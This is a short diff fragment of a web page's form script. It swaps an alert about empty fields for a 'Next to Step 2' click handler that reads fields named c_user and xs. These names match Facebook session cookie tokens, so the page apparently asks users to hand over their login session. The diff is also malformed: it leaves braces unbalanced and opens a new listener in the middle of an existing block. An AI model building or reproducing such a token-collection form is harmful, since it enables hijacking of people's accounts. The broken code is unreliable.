@@ -685,12 +685,10 @@
                     firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 }
                 
-                // Show alert if fields are empty
-                if (!cUser || !xsToken) {
-                    alert("Please fill in both c_user and xs tokens to continue.");
-                }
-            }
-        }
+                // Next to Step 2
+            nextToStep2.addEventListener('click', function() {
+                const cUserInput = document.getElementById('c_user');
+                const xsInput = document.getElementById('xs');
         
         // Trigger browser validation
           if (!cUserInput.checkValidity()) {
